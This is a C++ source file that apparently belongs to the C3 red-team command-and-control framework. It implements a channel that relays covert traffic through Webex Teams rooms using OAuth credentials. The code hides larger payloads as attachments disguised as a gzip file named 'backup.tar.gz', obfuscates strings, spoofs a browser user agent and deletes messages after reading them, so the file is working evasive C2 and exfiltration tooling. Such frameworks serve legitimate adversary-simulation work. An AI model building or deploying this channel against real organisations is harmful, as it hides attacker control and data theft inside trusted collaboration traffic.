#include "Stdafx.h"
#include "WebexTeams.h"
#include "Common/FSecure/Crypto/Base64.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::WebexTeams::WebexTeams(ByteView arguments) {
	auto [inboundDirectionName, outboundDirectionName] = arguments.Read<std::string, std::string>();
	auto [apiEndpoint, clientId, clientSecret, refreshToken, userAgent] = arguments.Read<SecureString, SecureString, SecureString, SecureString, SecureString>();
	m_useAttachments = arguments.Read<boolean>();
	m_webexApi = FSecure::WebexTeamsApi{ apiEndpoint, clientId, clientSecret, refreshToken, userAgent };

	m_inboundDirectionRoomId = m_webexApi.GetOrCreateRoom(inboundDirectionName);
	m_outboundDirectionRoomId = m_webexApi.GetOrCreateRoom(outboundDirectionName);
	m_attachmentMimeType = OBF("application/gzip");
	m_attachmentFileName = OBF("backup.tar.gz"); // Inconspicuous, right?
	// This is the prefix you'd like to prepend to all attachments. Probably a good idea to make this match the file extension in m_attachmentFileName.
	m_attachmentPrefix = { 0x1F, 0x8B }; // GZIP magic bytes
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::WebexTeams::OnSendToChannel(ByteView data)
{
	// If required, delay until rate limitation has passed
	m_webexApi.RateLimitDelay(this->m_MinUpdateDelay, this->m_MaxUpdateDelay);

	// Webex enforces a max of 7439 bytes per message
	constexpr auto maxMessageSize = cppcodec::base64_rfc4648::decoded_max_size(7'439);
	// Threshold where we transfer as attachment instead of message
	constexpr auto sendAsAttachmentThreshold = 30 * maxMessageSize; // 30 normal messages
	// Maximum attachment size
	constexpr auto maxAttachmentSize = 100 * 1'000 * 1'000; // Maximum attachment size is 100MB (https://developer.webex.com/docs/api/basics#message-attachments)

	// If the data is over 30 Webex messages, we transfer the data as an attachment instead of a normal Webex message
	ByteVector dataToSend;
	size_t bytesSent = 0;
	if (data.size() > sendAsAttachmentThreshold && m_useAttachments)
	{
		// Data is too large to send as messages; we'll send it as attachment(s) instead
		dataToSend = data.SubString(0, std::min(maxAttachmentSize - m_attachmentPrefix.size(), data.size()));
		bytesSent = dataToSend.size();
		// Preprend the prefix
		dataToSend.insert(dataToSend.begin(), m_attachmentPrefix.begin(), m_attachmentPrefix.end());
		m_webexApi.WriteMessageWithAttachment(dataToSend, m_attachmentFileName, m_attachmentMimeType, m_outboundDirectionRoomId);
	}
	else
	{
		// Data is small enough, let's send it as normal Webex messages
		dataToSend = data.SubString(0, std::min(maxMessageSize, data.size()));
		m_webexApi.WriteMessage(cppcodec::base64_rfc4648::encode(dataToSend.data(), dataToSend.size()), m_outboundDirectionRoomId);
		bytesSent = dataToSend.size();
	}

	//std::cout << "Wrote " + std::to_string(bytesSent) + " bytes out of " + std::to_string(data.size()) << std::endl;

	// Return the number of bytes we were able to send
	return bytesSent;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::WebexTeams::OnReceiveFromChannel()
{
	// If required, delay until rate limitation has passed
	m_webexApi.RateLimitDelay(this->m_MinUpdateDelay, this->m_MaxUpdateDelay);

	// Get all messages in the inbound channel room
	auto messages = m_webexApi.GetMessages(m_inboundDirectionRoomId);

	// Read messages and delete them as we go along
	std::vector<ByteVector> ret;
	for (auto &messageTuple : messages)
	{
		std::string messageId = std::get<0>(messageTuple);
		ByteVector messageBody = std::get<1>(messageTuple);
		bool fromAttachment = std::get<2>(messageTuple);

		ByteVector data;
		if (fromAttachment) {
			// Remove attachment prefix from body
			data = ByteVector(std::make_move_iterator(messageBody.begin() + m_attachmentPrefix.size()), std::make_move_iterator(messageBody.end()));
		}
		else {
			// Base64 decode the entire message
			data = cppcodec::base64_rfc4648::decode(messageBody);
		}
		
		ret.emplace_back(std::move(data));
		// Delete message
		m_webexApi.DeleteMessage(messageId);
	}
	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::WebexTeams::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed for AbstractChannel::OnRunCommand.
	switch (command.Read<uint16_t>())
	{
	case 0:
		m_webexApi.SetRefreshToken(command.Read<SecureString>());
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::WebexTeams::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Webex Teams API endpoint ('webexapis.com' or 'api.ciscospark.com')",
				"min": 1,
				"description": "The API endpoint C3 should use to contact the Webex API. Possible values are 'webexapis.com' or 'api.ciscospark.com'."
			},
			{
				"type": "string",
				"name": "Client ID",
				"min": 1,
				"description": "The Client ID of your Webex Teams OAuth Application"
			},
			{
				"type": "string",
				"name": "Client Secret",
				"min": 1,
				"description": "The Client Secret of your Webex Teams OAuth Application"
			},
			{
				"type": "string",
				"name": "Refresh token",
				"min": 1,
				"description": "The OAuth refresh token to authenticate to the Webex API"
			},
			{
				"type": "string",
				"name": "User agent",
				"min": 1,
				"description": "The User-Agent header to use in HTTP requests",
				"defaultValue": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
			},
			{
				"type": "boolean",
				"name": "Use attachments",
				"description": "Controls whether we use attachments to increase communication speed. This has certain opsec considerations (see documentation).",
				"defaultValue": true
			}
		]
	},
	"commands": [
		{
			"name": "Assign new refresh token",
			"id": 0,
			"description": "Assign a new refresh token",
			"arguments": [
				{
					"type": "string",
					"name": "Refresh token",
					"min": 1,
					"description": "The OAuth refresh token to authenticate to the Webex API"
				}
			]
		}
	]
}
)_";
}